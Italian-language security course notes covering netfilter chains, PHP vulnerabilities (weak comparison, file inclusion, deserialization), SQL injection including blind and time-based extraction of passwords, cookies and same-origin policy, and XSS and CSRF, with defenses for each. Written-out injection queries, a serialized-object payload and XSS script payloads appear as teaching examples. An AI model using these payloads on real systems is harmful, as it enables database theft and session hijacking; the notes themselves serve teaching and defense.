    ![https://i.ibb.co/5jVZrtK/image.png](https://i.ibb.co/5jVZrtK/image.png)
    
    Ci riferiamo a DNAT (Destination NAT) per riferirci alla traduzione degli indirizzi per il traffico entrante in arrivo da internet (che va verso la rete locale)
    
    ![https://i.ibb.co/6yTs2HF/image.png](https://i.ibb.co/6yTs2HF/image.png)
    

Tipicamente è consigliato utilizzare un approccio di **privilegio minimo**: cioè droppare di default e far passare solamente ciò che è necessario.

## Netfilter

**Netfilter** è un tool Linux che gestisce il filtraggio dei pacchetti di rete. Il suo scopo principale è implementare funzionalità come firewall, NAT, e il controllo del traffico di rete.

Le regole di Netfilter sono implementate tramite strumenti come **iptables.**

Le regole sono implementate in **catene (chains)**, che definiscono il flusso del traffico di rete attraverso il sistema. Ogni pacchetto in transito viene processato attraverso una sequenza di catene e regole associate, che determinano cosa fare con il pacchetto (accettarlo, rifiutarlo, modificarlo, ecc…).

Le principali **catene** predefinite di Netfilter sono:

1. **INPUT**: gestisce i pacchetti destinati al sistema (ricevuti da una rete remota o locale).
2. **OUTPUT**: gestisce i pacchetti in uscita dal sistema.
3. **FORWARD**: gestisce i pacchetti che passano attraverso il sistema senza essere destinati ad esso (ad esempio, nel caso di un router).
4. **PREROUTING**: applicato ai pacchetti appena ricevuti, prima che vengano instradati.
5. **POSTROUTING**: applicato ai pacchetti che stanno per essere inviati, dopo l'instradamento.

Le **regole** vengono **applicate in ordine sequenziale** dentro ciascuna catena. Quando un pacchetto entra in una catena, Netfilter verifica se esistono regole che corrispondono al pacchetto stesso. Se una regola corrisponde, viene eseguita l'azione associata (ad esempio, accettare, rifiutare o modificare il pacchetto). Se nessuna regola corrisponde, viene eseguita l'azione di default ("DROP" o "ACCEPT").


# Attacchi web server side

Le applicazioni web sono molto complesse e possono soffrire di una grande vastità di attacchi come:

- attacchi diretti al codice lato server
- attacchi ai database
- attacchi eseguiti nel browser dell'utente
- attacchi alla rete

Data la natura di questi attacchi, è fondamentale adottare i principi di *secure coding* durante lo sviluppo di un'applicazione web. I principi cardine includono:

- un'attenta **gestione dell'input** utente per evitare manipolazioni del flusso di controllo
- l'adozione di pratiche di sicurezza in base ai linguaggi utilizzati
- evitare soluzioni ad hoc preferendo quelle standard.

Vediamo quattro esempi di comuni vulnerabilità nel linguaggio PHP.

## 1 String comparison attacks

PHP, non richiede una definizione esplicita del tipo di variabile in quanto viene determinato dinamicamente in base al contesto tramite un meccanismo chiamato t*ype juggling* che esegue conversioni automatiche.

Questo meccanismo, sebbene semplifichi la scrittura del codice, può introdurre comportamenti imprevedibili se si utilizza l'operatore di confronto debole `==`, dato che questo operatore esegue il confronto **dopo** la conversione automatica. Al contrario, l'operatore di confronto stretto `===` verifica l'uguaglianza sia del valore che del tipo senza la conversione automatica.

Gli attacchi basati sul **confronto di stringhe** sfruttano queste comparazioni deboli per modificare il flusso di controllo dell'applicazione.

Vediamo degli esempi di attacco nello specifico

- **Bypass dell’autenticazione**: Un token di sessione, tipicamente memorizzato in un cookie, viene confrontato lato server con un valore di riferimento per autenticare l'utente. Un attaccante può sfruttare il confronto debole per bypassare l'autenticazione fornendo un valore che, dopo la conversione, risulti uguale al token.
    
    ```php
    <?php
    	 // token stored on the server
    	 $token = ... ;
    	 
    	 // User input, e.g. coming from a cookie
    	 $input = $_COOKIE['user_token']
    	 
    	 if ($input == $token) {
    		 // access to privileged area
    		 echo "Authenticated!";
    	 }
    	 else {
    		 // login required ...
    		 echo "Please authenticate";
    	 }
    ?>
    ```
    
    Se avessimo un token del tipo `“0e394…”` in questo caso tale stringa potrebbe essere convertita in un intero scritto in notazione esponenziale ($0\cdot 10^{394…} = 0$), per cui se l’attaccante fornisce l’input `“0”` supererebbe il confronto debole, venendo quindi autenticato.
    
    Si potrebbe pensare che usare strcmp renda il codice più sicuro, in quanto viene delegato il controllo ad una funzione nativa, ma il problema comunque rimane se facciamo il confronto in questo modo:
    
    `if (strcmp($input, $token) == 0) {`
    
    se `strcmp` fallisce ritorna `NULL`, ma `NULL` viene convertito in `0` e quindi si supera il controllo.
    

## 2 File inclusion attacks

Prendiamo d’esempio un codice in cui vengono caricate delle pagine in modo dinamico in base ad un parametro passato in GET dall’utente:

```php
<?php
	if(isset($_GET["p"])) {
		 include($_GET["p"]);
	}
	else {
		 include("home.html");
	}
?>
```

Con il metodo GET i parametri sono in chiaro sull’URL, quindi l’utente può scrivere quello che vuole, ad esempio mettere il percorso di file all’interno del server.

## 3 Deserialization attacks

Negli URL è possibile usare un sottoinsieme dei caratteri ASCII, alcuni caratteri sono riservati per essere utilizzati come delimitatori (es. `/` `?` `:` `+` `=`). Tali caratteri possono essere messi nell’URL ma verranno sostituiti da un carattere `%` seguito da due caratteri esadecimali.

```
How are you?
How%20are%20you%3F
```

anche i cookie seguono questa codifica (che avviene in automatico su PHP)

L'attacco di deserializzazione, sfrutta il **meccanismo di serializzazione e deserializzazione degli oggetti**. La serializzazione converte un oggetto in una stringa di testo. La **deserializzazione**, al contrario, ricostruisce l'oggetto a partire dalla stringa.

Il problema risiede nel fatto che la deserializzazione di una stringa proveniente da una fonte non affidabile può portare all'esecuzione di codice arbitrario.

Questo è possibile perché la deserializzazione può richiamare automaticamente dei metodi speciali, chiamati "**metodi magici**", definiti all'interno della classe dell'oggetto.
Ad esempio il metodo magico `__wakeup()` viene invocato automaticamente dopo la deserializzazione di un oggetto appartenente a quella classe.

Un attaccante può creare un oggetto appartenente ad una classe presente sul server, inserire del codice malevolo, serializzarlo, codificarlo come URL e inserirlo in un cookie.

Quando il server prenderà il cookie, la stringa verrà deserializzata e il codice malevolo all’interno di `__wakeup()` verrà eseguito.

Codice del server:

```php
class Example {
	 private $hook;
	 // some PHP code...
	 function __wakeup() {
		 if (isset ($this->hook)) eval ($this->hook);
	 }
}

// simulating the attack
$user_data = unserialize(urldecode('O%3A8%3A%22Example2%22%3A1%3A%7Bs%3A14%3A%22%00Exam ple2%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D'));
```

La stringa codificata è stata prodotta dall’attaccante in questo modo, serializzando una istanza della classe `Example`:

```php
<?php
	class Example
	{
		 private $hook = "phpinfo();";
	}
	
	echo urlencode(serialize(new Example));
?>
```

## 4 SQL injection attacks

SQL injection è un attacco che prevede di inserire query SQL arbitrarie nei campi di input, con l’obiettivo che tali stringhe vengano messe all’interno di query reali senza una corretta sanitizzazione modificandone quindi il comportamento.

Vediamo un esempio di query per ottenere le informazione di un utente in base al cognome inserito dall’utente in un form di input.

 
`$query = "SELECT name, lastname FROM people WHERE lastname = '" . $_POST['lastname'] . "'";`

Nota che `.` serve per concatenare stringhe in PHP.

L’attaccante ha il controllo di una parte della query, cioè `$_POST['lastname']`.

L’attaccante può inserire un `'` per lasciare la stringa vuota a aggiungere un altro confronto che risulterà essere sempre vero per poi commentare la restante parte della query per evitare che la query vada in errore.

Ad esempio ottenendo una query di questo tipo:

`SELECT name, lastname FROM people WHERE lastname = '' OR 1 -- '`

In questo modo la condizione nel `where` sarà sempre vera e l’attaccante ottiene il risultato della query anche se non dovrebbe.

### Attacchi black box al database

L’attaccante potrebbe non sapere i nomi di tabelle e colonne all'interno di un database. 

Può sfruttare il comando `UNION ALL` per fare il dump di altre tabelle.

Un attacco black box inizia con la determinazione del numero di colonne tramite una serie di tentativi con query del tipo

- `... where lastname = '' UNION ALL SELECT 1 #'`
- `... where lastname = '' UNION ALL SELECT 1,2 #'`
- `... where lastname = '' UNION ALL SELECT 1,1,1 #'`
- …

 fino a quando la query restituisce un output.

Successivamente, si ipotizzano i nomi delle tabelle usando nomi comuni come `users`, `customers`, `people`,

- `... where lastname = '' UNION ALL SELECT 1,1,1 FROM users #'`
- `... where lastname = '' UNION ALL SELECT 1,1,1 FROM customers #'`
- `... where lastname = '' UNION ALL SELECT 1,1,1 FROM people #'`
- …

fino a quando si ottiene una risposta positiva.

Lo stesso metodo può essere applicato per scoprire i nomi delle colonne.

Siccome il comando `UNION ALL` richiede che le due tabelle unite selezionino lo stesso numero di colonne, se la seconda tabella che vogliamo dumpare ha più colonne della prima, la query andrà in errore, ma possiamo usare a concatenazione di colonne in un'unica colonna utilizzando la funzione `CONCAT()`.

Un altra cosa che l’attaccante può fare è dumpare le informazioni contenute nel database `information_schema`, il quale contiene informazioni su tutti gli altri database presenti nel sistema tra cui i nomi dei database, le tabelle e le colonne.

## Tecniche di difesa

### SQL injection

Per contrastare gli attacchi SQL injection, si possono usare i **prepared statements**, un meccanismo che prevede la preparazione della query da parte del database prima che i parametri effettivi vengano inseriti. In questo modo, l'input fornito dall'utente non viene interpretato come codice SQL. 

Esempio:

![https://i.ibb.co/TqTykb7/image.png](https://i.ibb.co/TqTykb7/image.png)

Anche da PHP si possono usare i prepared statemet:

```php
$stmt = $link->prepare("SELECT name, lastname, url FROM people WHERE lastname = ?");
$stmt->bind_param("s", $_POST['lastname']);
$stmt->execute();
```

Non tutte le parti di una query SQL possono essere parametrizzate con le *prepared statements, a*d esempio, il nome della tabella. Per questo si utilizzano tecniche come il **type casting**, il **whitelisting** e la **sanitizzazione** dell'input.

- Il **type casting** consiste nella conversione dei parametri numerici in interi, impedendo l'inserimento di payload arbitrari che potrebbero contenere codice dannoso.
- Il **whitelisting** limita l'input dell'utente a un insieme predefinito di valori considerati validi
- La **sanitizzazione** prevede l'escape dei caratteri speciali presenti nell'input dell'utente prima che venga utilizzato nella query, riducendo la possibilità di interpretazioni errate.

### Best practice generali

Oltre alle tecniche specifiche per prevenire le SQL injection, vediamo delle *best practices* di sicurezza per lo sviluppo di applicazioni web in PHP.

1. **Utilizzo del confronto stretto (===)**: L'uso dell'operatore di confronto stretto (===), che verifica sia il valore che il tipo senza conversioni automatiche, previene attacchi basati su manipolazioni del confronto di stringhe.
2. **Casting dei valori o controllo dei tipi**: prima di utilizzare una variabile in una funzione, è consigliabile eseguire il casting esplicito al tipo di dato atteso o verificare il tipo di dato effettivo.
3. **Whitelist rigorosa**: quando possibile, limitare l'input dell'utente a un insieme predefinito di valori validi. Questa tecnica, detta *whitelisting*, è particolarmente efficace per prevenire attacchi di *file inclusion*.
4. **Verifica dell'integrità dell'input**: prima di utilizzare l'input dell'utente in funzioni potenzialmente pericolose, come la deserializzazione, è fondamentale verificarne l'integrità per individuare eventuali modifiche malevole. Questa verifica può essere effettuata utilizzando tecniche come HMAC (*Hash-based Message Authentication Code*). HMAC utilizza una chiave segreta per generare un hash per il messaggio.
    
    Quindi il web server genera una chiave segreta internamente. Quando esporta dati li manda in chiaro affiancati dal rispettivo hash. Quando invece importa dati, prima di utilizzarli (ad esempio fare la deserializzazione) si ricalcola l’hash dei dati e verifica che il risultato combaci con l’hash ricevuto
    
5. **Funzioni e API sicure**: quando disponibili, utilizzare funzioni e API standard. Queste funzioni spesso implementano internamente le *best practices* di sicurezza.

# Side channels

È comune che i software abbiano dei **side effect**, cioè degli effetti osservabili che riflettono lo stato interno del programma. Se i side effect dipendono da un valore segreto si ha un **leak parziale**, se tale leak è sufficiente per scoprire il segreto allora abbiamo un attacco.

Un esempio può essere il controllo di una password: ad ogni tentativo l’attaccante scopre che una determinata password è sbagliata. Questo è un leak parziale, infatti l’attaccante può tentare un attacco **brute force**. Per difendersi si può limitare il numero di tentativi.

## Side channels

I **side channels** (o **canali laterali**) nella sicurezza informatica sono metodi per estrarre informazioni sensibili da un sistema, sfruttando i side effect e caratteristiche fisiche anziché attacchi diretti sui dati o sugli algoritmi.

### Esempi di side channels:

- **Attacco alla cache (*Cache attack*)**: un attacco in cui l’attaccante monitora gli accessi alla memoria cache in un sistema che utilizza risorse condivise, come in un ambiente virtualizzato o in certi servizi in cloud
- **Attacco a cronometro (*Timing attack*)**: un attacco che si basa sulla misura dei tempi di esecuzione di certi calcoli, ad esempio il confronto dei tempi di criptazione della password ignota con i tempi di criptazione di password note
- **Attacco di monitoraggio dei consumi (*Power-monitoring attack*)**: attacchi che analizzano il consumo di energia del sistema da violare, per capirne le caratteristiche
- **Attacco elettromagnetico (*Electromagnetic attack*)**: attacchi basati sul rilevamento dell'energia elettromagnetica, che possono rivelare direttamente dati e altre informazioni
- **Analisi differenziale dei malfunzionamenti (*Differential fault analysis*)**: si deducono informazioni sul sistema analizzando malfunzionamenti provocati appositamente

Ad esempio in un login quando username o password sono errati è raccomandato restituire un generico “credenziali errate” al posto di specificare quale dei due è errato (in quanto potrebbe aiutare un attaccante).

Un altro esempio è di utilizzare codice ***time-safe***: il controllo di una password è più lento di un controllo di un username (a causa dell’hashing per esempio), questo può essere notato da un attaccante e dedurre quale delle due credenziali è errata. Funzioni time-safe impiegano lo stesso tempo indipendentemente dai dati su cui operano.

## Blind SQL injection

La **Blind SQL injection** è una tecnica di attacco che sfrutta i side channel per ottenere informazioni da un database.

Si utilizza solitamente quando il risultato di una query non viene visualizzato direttamente sulla pagina web, ma l'applicazione fornisce comunque un feedback osservabile che dipende dallo stato interno del database, come un messaggio particolare, un errore, una pagina rotta, o una pagina vuota.

Possiamo pensare quindi di ottenere una risposta boolena, e iterando questa tecnica si riesce ad leakare dati sensibili.

### Funzionamento generale

1. **Iniezione della query**: l'attaccante inietta codice SQL malevolo nell'input di un'applicazione web.
2. **Osservazione del side channel**: l'attaccante osserva il comportamento dell'applicazione, cercando differenze nel tempo di risposta, nei messaggi di errore, o altri comportamenti che possono rivelare informazioni sul database.
3. **Deduzione dei dati**: l'attaccante deduce i dati del database in base al feedback ottenuto. Questo processo può essere iterato per ottenere gradualmente le informazioni desiderate.

### **Esempio:**

Supponiamo un servizio di recupero password che invia un'email con una nuova password agli utenti registrati nel sistema.

Se l'utente esiste, l'email viene inviata, altrimenti viene visualizzato un messaggio di errore.

Questo scenario può essere vulnerabile ad una blind SQL injection se l'attaccante può manipolare la query che controlla l'esistenza dell'utente nel database.

Supponiamo che la query per controllare l’esistenza dell’utente sia del tipo:

`SELECT 1 FROM ... WHERE ... email='EMAIL’`

dove `EMAIL` è un input utente.

- L'attaccante può modificare il comportamento della query, ad esempio aggiungendo una condizione che è sempre vera (come `'OR 1 #`).
- Se l'applicazione invia comunque l'email (e quindi non viene restituito un errore), significa che il database è vulnerabile a SQL injection.
- A questo punto l’attaccante fa una injection e compone una query di questo tipo con lo scopo di ottenere il nome delle tabelle dal database andando a tentativi:
    
    ```sql
     SELECT 1
     FROM people
     WHERE mail='' OR (SELECT 1 FROM users LIMIT 1)=1 LIMIT 1;
    ```
    
    In questo modo se non viene dato errore scopriamo che la tabella `users` esiste, altrimenti possiamo pensare che la tabella non esista.
    
- L’attaccante può adesso controllare l’esistenza di una particolare colonna, tramite la funzione SQL `MID`. Tale funzione prende tre parametri `MID(string, start_pos, len)` e restituisce una sottostringa di `string` di lunghezza `len` partendo dalla posizione `start_pos` (nota che gli indici in SQL partono da 1, non da 0).
    
    Verrà composta la seguente query per controllare l’esistenza della colonna `password`:
    
    ```sql
    SELECT 1
    FROM people
    WHERE mail=' ' OR (SELECT MID(password,1,0) FROM people LIMIT 1)='' #
    ```
    
    se la colonna `password` non esiste la query darà errore, altrimenti darà successo in quanto stiamo prendendo una sottostringa di lunghezza zero uguale quindi a `''`.
    
- A questo punto l'attaccante può fare la query carattere per carattere fino a scoprire la password completa.
    
    Si può fare una ricerca binaria per ridurre il numero di tentativi:
    
    la funzione `ORD` restituisce il codice ASCII del caratteri più a sinistra della stringa che prende in input
    
    ```sql
    SELECT 1
    FROM people
    WHERE mail=' ' OR (SELECT ORD(MID(password,1,1)) FROM people LIMIT 0,1)<=ORD('m') #
    					 -> FALSE
    SELECT 1
    FROM people
    WHERE mail=' ' OR (SELECT ORD(MID(password,1,1)) FROM people LIMIT 0,1)<=ORD('t') #
    					 -> FALSE
    SELECT 1
    FROM people
    WHERE mail=' ' OR (SELECT ORD(MID(password,1,1)) FROM people LIMIT 0,1)<=ORD('w') #
    					 -> FALSE
    SELECT 1
    FROM people
    WHERE mail=' ' OR (SELECT ORD(MID(password,1,1)) FROM people LIMIT 0,1)<=ORD('y') #
    					 -> TRUE
    SELECT 1
    FROM people
    WHERE mail=' ' OR (SELECT ORD(MID(password,1,1)) FROM people LIMIT 0,1)<=ORD('x') #
    					 -> TRUE
    ```
    
    ![https://i.ibb.co/X2yDcTk/image.png](https://i.ibb.co/X2yDcTk/image.png)
    

## Totally blind SQL injection

Anche in caso in cui la web application non mostra errori, messaggi particolari, o altri feedback visibili che possono portare a leak parziali, è comunque possibile per l’attaccante sfruttare il **tempo** per fare SQL injection, pratica chiamata *Totally Blind SQL Injection.*

Sempre nella situazione precedente l’attaccante può fare una cosa del tipo:

```sql
SELECT 1
FROM people
WHERE mail='' OR (SELECT
		IF((SELECT ORD(MID(password,1,1)) FROM people LIMIT 0,1)<=ORD('m'), 
       SLEEP(1),
       NULL)
   ) #
```

la sintassi dell’`IF` è la seguente `IF(*condition*, *value_if_true*, *value_if_false*)`.

Cioè quando la query ha successo viene fatto uno sleep di un secondo che può essere notato dall’attaccante per capire il successo o meno della query.


# Attacchi web client side

## Token di sessione

Oltre agli attacchi diretti al codice lato server o ai database, esistono attacchi che sfruttano il **browser**, sono quindi **lato client**.

Le applicazioni web di solito mantengono uno **stato**, ad esempio quando un utente fa un login, inizia una sessione tramite un **token di sessione** che identifica l’utente senza che esso si autentichi su ogni pagina (questo meccanismo è dovuto al fatto che HTTP è un protocollo stateless).

Il token di sessione può essere memorizzato in diversi modi ma quello standard è nei **Cookie del browser**, in questo modo il token viene automaticamente passato assieme ad ogni richiesta verso il server.

Se un token di sessione viene indovinato o divulgato, l'utente può essere impersonificato da qualcun altro, pertanto, il token deve essere **imprevedibile** **e segreto**.

### Cookie

Un cookie viene impostato nell’header HTTP `Set-cookie` presente all’interno di una risposta dal server verso il client, è formato nel seguente modo:

```
Set-Cookie: NAME=VALUE; Domain=example.com; Path=/; Expires=Wed, 09 Dec 2024 12:00:00 GMT; Secure; HttpOnly; SameSite=Strict
```

- `NAME=VALUE`: Nome e valore del cookie.
- `Domain=example.com` (opzionale): Specifica il dominio per cui il cookie è valido.
- `Path=/` (opzionale): Specifica il percorso del dominio a cui il cookie si applica.
- `Expires=Wed, 09 Dec 2024 12:00:00 GMT` (opzionale): Indica la data e l'ora in cui il cookie scadrà. Se non è specificato verrà eliminato alla chiusura del browser.
- `Secure` (opzionale): Indica che il cookie deve essere trasmesso solo su connessioni HTTPS.
- `HttpOnly` (opzionale): Indica che il cookie non è accessibile tramite JavaScript (ad esempio, usando `document.cookie`)
- `SameSite=Strict|Lax|None` (opzionale): indica se il cookie deve essere allegato a richieste provenienti da altri siti:
    - `Strict`: Il cookie viene inviato **solo** quando il client interagisce direttamente con il dominio specificato nel cookie (digitandolo nella barre dell’URL).
        
        Se l'utente clicca su un link in un altro sito che reindirizza al dominio specificato, il cookie **non** viene inviato.
        
    - `Lax`: Il cookie viene inviato anche quando il client clicca su un link in un altro sito che lo reindirizza al dominio specificato.
        
        Il cookie **non** viene inviato per richieste automatiche originate da un altro sito, come caricamenti di immagini o iframe.
        
    - `None`: Il cookie viene inviato in **tutte le richieste.** Tuttavia, deve essere accompagnato dal flag `Secure`

Il browser allega automaticamente i cookie ad una richiesta web quando:

- il dominio dell'URL finisce come il dominio specificato nel cookie, ad esempio  `sub.example.com` finisce come `example.com` che è specificato nel cookie.
- il path dell'URL inizia come il path specificato nel cookie, ad esempio `https://example.com/app/dashboard` inizia per `/app` che è specificato nel cookie
- il protocollo è HTTPS se il cookie è contrassegnato come `secure`.

È possibile **creare ed eliminare i cookie in JavaScript** modificando `document.cookie`. Per eliminare un cookie, si imposta la sua data di scadenza nel passato.

**È possibile avere due cookie con lo stesso nome ma percorsi diversi.** Se i percorsi non sono disgiunti, entrambi i cookie vengono inviati al server e il modo in cui il server gestisce i cookie con lo stesso nome dipende dal linguaggio di programmazione, dal framework o dalla libreria utilizzata.

Alcuni linguaggi, come Java, JavaScript e Go, leggono i cookie come una **lista**, mentre altri, come PHP, Python e Node.js, usano un **dizionario**, rendendo imprevedibile quale dei due cookie verrà utilizzato.

Lo stato della sessione può essere memorizzato sul server o sul client.

- I **server con stato** utilizzano un cookie `secure` e `HttpOnly` nel browser del client ma mantengono lo stato nel server. Questo approccio può comportare un sovraccarico eccessivo lato server.
- I **server senza stato** crittografano i dati di sessione insieme a un ID utente e un timestamp utilizzando una chiave del server. Memorizzano il blob crittografato in un cookie nel browser del client, nel server viene solo mantenuto un timestamp di login o logout per validare il blob quando viene ricevuto dal client.

## SOP

Un browser permette di navigare più siti contemporaneamente, per fornire un adeguato isolamento tra le varie pagine web aperte nello stesso browser si implementa la SOP.

La **Same Origin Policy (SOP)** è una politica di sicurezza standard dei browser che limita l'accesso tra documenti o script caricati da domini diversi.

![https://i.ibb.co/gZF4Wcf/image.png](https://i.ibb.co/gZF4Wcf/image.png)

Due pagine hanno la **stessa origine** se il **protocollo, la porta e l'host** sono gli stessi per entrambe le pagine.

Ad esempio con la pagina  `http://store.company.com/dir/page.html`

```
http://store.company.com/dir2/other.html  OK stessa origine
http://store.company.com/dir/in/pag.html  OK stessa origine
https://store.company.com/secure.html     NO protocollo diverso
http://store.company.com:81/dir/etc.html  NO porta diversa
http://news.company.com/dir/other.html    NO host diverso
```

Se l'origine è diversa (si ha *cross-origin*), SOP limita o vieta:

- l'accesso alla rete
- script API
- l'archiviazione dei dati e i cookie.

### Accesso alla rete

Le **scritture cross-origin** sono in genere **consentite**, si tratta di inviare dati verso un'altra origine senza aspettarsi di ricevere risposta (seguire un link, il reindirizzamento e l'invio di un form).

L'**embedding cross-origin** è in genere **consentito**, si tratta di inserire risorse di un'altra origine nella pagina corrente per scopi di visualizzazione o funzionalità (immagini, CSS e JavaScript).

Le **letture cross-origin**, sono in genere **vietate**, si tratta di cercare di accedere o leggere il contenuto di una risorsa da un'altra origine (usare `fetch` per ottenere dati JSON da un'API su un dominio diverso e leggere la risposta).

### Script API

Alcune API JavaScript consentono ai documenti di fare riferimento l'uno all'altro, ma l'accesso è limitato se i due documenti hanno origine diversa.

Questa restrizione può essere allentata modificando `document.domain`, utile quando le pagine web appartenenti a sottodomini diversi devono comunicare.

![https://i.ibb.co/S6bY39h/image.png](https://i.ibb.co/S6bY39h/image.png)

### Archiviazione e cookie

Ogni origine ha il proprio spazio di archiviazione.

Per i cookie, il protocollo è facoltativo e viene considerato il path invece della porta, quindi l’origine viene identificata da **Protocol, host e path**.


# XSS e CSRF

Il **Cross-Site Scripting** (XSS) è un attacco di **injection di codice all’interno di pagine web** che può portare a:

- leak di informazioni sensibili
- controllo dell'applicazione
- il dirottamento della sessione

Il codice iniettato viene **eseguito nel browser della vittima**. XSS bypassa la *Same Origin Policy* (SOP), consentendo al codice iniettato di accedere direttamente a qualsiasi informazione della pagina vulnerabile, inclusi i cookie di sessione.

![https://i.ibb.co/5K2rm4V/image.png](https://i.ibb.co/5K2rm4V/image.png)

Esistono tre tipi di vulnerabilità XSS che differiscono in base a come viene iniettato il codice e se esso è persistente o meno:

- **Reflected XSS**
- **Stored XSS**
- **DOM-based XSS**

## Reflected XSS

Assumiamo che la pagina web mandi una richiesta al server incorporando l'input dell’utente come parte della richiesta, il server risponde inviando una pagina html in cui ha inserito l’input dell’utente.

Se l’input inserito dall’utente contiene del codice (ad esempio uno script JavaScript) allora quando il client riceve la risposta dal server, la nuova pagina html conterrà tale script che verrà eseguito sulla sua macchina.

Un esempio tipico in cui si può verificare questo attacco è il seguente:

- la vittima riceve una mail di phishing e clicca su un link verso una pagina vulnerabile a XSS: su tale link l’attaccante ha scritto anche lo script javascript
- quando la vittima clicca sul link, il server gli risponde con una pagina html contenente lo script malevolo dell’attaccante
- quando il browser renderizza la pagina html ricevuta, lo script malevolo viene eseguito

### Esempio pratico

Immaginiamo di avere questo file `.php` che stampa a schermo i parametri `name` e `surname` ottenuti da una richiesta GET (sull’URL).

```php
<html>
  <body>
<?php
    header("X-XSS-Protection: 0");
    session_name("SESSID1");
    session_start();
    echo "Welcome, " . $_GET['name'] . $_GET['surname'];
?>
  </body>
</html>

```

quindi alla seguente richiesta: `http://localhost/greet.php?name=Mario%20&surname=Rossi`

otteniamo la seguente pagina web

![https://i.ibb.co/7zPvK4L/image.png](https://i.ibb.co/7zPvK4L/image.png)

Supponiamo che l’attaccante costruisca un link di questo tipo:

`http://localhost/greet.php?name=<script>alert("this come from injected code")</script>`

se la vittima clicca su questo link otterrà la seguente pagina web:

![https://i.ibb.co/ZW408jk/image.png](https://i.ibb.co/ZW408jk/image.png)

Logicamente dentro `<script>…</script>` l’attaccante può mettere ciò che vuole, ad esempio ottenere il cookie dell’utente (se non è flaggato con `HttpOnly`).

Per nascondere la reale struttura dei link, gli attaccanti possono usare degli **URL shortener**, per cui quando si incontrano link generati da questi shortener bisogna prestare molta attenzione.

## Stored XSS

Si verifica quando un'applicazione web memorizza l'input utente inviato al server e lo visualizza in una qualche pagina web, ad esempio un post in un forum.

Se l'input contiene codice dannoso, questo verrà eseguito ogni volta che un utente visita la pagina infetta.

## **DOM-based XSS**

Simile a reflected XSS, ma lo script non viene aggiungo alla pagina html durante la sua creazione nel server ma avviene lato client a causa di script esistenti sul client che ad esempio processano i parametri dell’URL per fare delle azioni.

### Esempio pratico

Immaginiamo di avere questo file `.html` che contiene uno script JavaScript che crea il primo elemento di un campo `<select></select>` in modo dinamico leggendo il parametro `default` nell’URL:

```html
Select your language:
<select>
	<script>
		document.write(
			"<OPTION value=1>"
			+ decodeURI(document.location.href.substring(
			document.location.href.indexOf("default=")+8))
			+ "</OPTION>"
		);
		document.write("<OPTION value=2>English</OPTION>");
	</script>
</select>
```

Una richiesta innocente è la seguente `http://localhost/page.html?default=Franch` che genera la seguente pagina:

![https://i.ibb.co/Z89wQr4/image.png](https://i.ibb.co/Z89wQr4/image.png)

Mentre una richiesta malevola può essere la seguente `http://localhost/page.html?default=<script>alert(document.cookie)</script>` che genera la seguente pagina

![https://i.ibb.co/r3x9YfQ/image.png](https://i.ibb.co/r3x9YfQ/image.png)

## **Prevenire attacchi XSS**

Per prevenire attacchi XSS è importante fare:

- **Validazione dell'output:** codificare i caratteri HTML (ad esempio, con `htmlspecialchars` in PHP) ed evitare di inserire input esterni direttamente dentro script JS.
- **Validazione dell'input:** consentire solo ciò che ci si aspetta in termini di lunghezza, caratteri e corrispondenza con le espressioni regolari. Utilizzare delle *whitelist* sull’input quando possibile.

controllare la presenza di “<script>” nell’input non è sufficiente perché codice JS può essere usato anche inline su alcuni tag html.

Sono inoltre molto importanti le seguenti pratiche:

- **Mettere il flag** `HttpOnly` **ai cookie:** impediscono agli script JS di leggere i cookie di sessione, proteggendoli dagli attacchi XSS.
- **Content Security Policy (CSP):** specifica i domini fidati per gli script e può disabilitare gli script inline.
- **XSS Auditor** (ormai deprecato)**:** blocca il codice nella pagina web che appare anche nella richiesta, mitigando gli attacchi XSS reflected.

## CSRF

**Cross-Site Request Forgery (CSRF)** è un attacco in cui l’attaccante crea richieste dannose per un'applicazione web in cui **l'utente è attualmente autenticato**.

Il punto cruciale è che i siti web non possono distinguere se le richieste provenienti da utenti già autenticati siano state originate da un'interazione esplicita dell'utente o meno.

CSRF è un attacco di integrità e **non è bloccato dalla Same Origin Policy (SOP).**

**Scenario tipico di un attacco CSRF:**

![https://i.ibb.co/BKkJhs2/image.png](https://i.ibb.co/BKkJhs2/image.png)

- Un utente è autenticato su un'applicazione web, ad esempio il suo sito di banking online.
- L'utente clicca su un link su un altro sito malevolo.
- Il sito web malevolo fa partire una richiesta dal browser verso all'applicazione web vulnerabile, ad esempio per effettuare un bonifico.
- Il browser dell'utente invia la richiesta all'applicazione web, includendo i cookie di autenticazione.
- L'applicazione web elabora la richiesta, credendo che provenga dall'utente in quanto esso è già autenticato dal cookie, ed esegue l'operazione.

## **Prevenire attacchi** CSRF

Diverse tecniche possono essere utilizzate per prevenire gli attacchi CSRF:

- **Token anti-CSRF:** un valore casuale associato alla sessione dell'utente e rigenerato a ogni richiesta. Il token è nascosto in ogni form e, quando il form viene inviato, il token viene confrontato con quello corrente. L'operazione è consentita solo se corrispondono.
    
    Il token anti-CSRF può anche essere salvato in un cookie del browser (variante *stateless*).
    
    ![https://i.ibb.co/C9VR8tY/image.png](https://i.ibb.co/C9VR8tY/image.png)
    
- **Uso degli header** `Origin` ****e `Referer`: l’header `Origin` è stato introdotto specificamente per prevenire CSRF, contenendo solo l'origine e non informazioni sensibili. Il server può verificare che l'origine corrisponda a quella prevista. Se `Origin` non è presente, è possibile controllare il `Referer`.
    
    ![https://i.ibb.co/bBbq0tB/image.png](https://i.ibb.co/bBbq0tB/image.png)
    
- **Uso di header personalizzati:** ad esempio per le richieste AJAX, si può verificare la presenza dell'header `X-Requested-With` con valore `XMLHttpRequest`. Questo funziona perché tale header non è impostabile da origini diverse da quella originale.
- **Interazione dell'utente:** per operazioni critiche, come i operazioni bancarie, è consigliabile richiedere un'**interazione esplicita dell'utente** come: ri-autenticazione, l'utilizzo di *One-Time Password* o l'inserimento di input extra (ad esempio, CAPTCHA).
    
    L’attaccante non sarà in grado di risolvere questi controlli prima di effettuare la richiesta e quindi non riuscirà nel suo intento.
